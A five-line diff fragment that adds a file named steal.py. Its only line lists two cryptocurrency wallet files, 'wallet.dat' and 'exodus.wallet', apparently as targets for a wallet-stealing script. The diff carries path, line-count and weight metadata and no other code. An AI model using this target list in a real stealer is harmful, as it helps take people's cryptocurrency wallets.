@@ -1,0 +1,5 @@
+# path: steal.py
+# lines: 1
+# weight: 35
+# ---
+targets = ["wallet.dat", "exodus.wallet"]
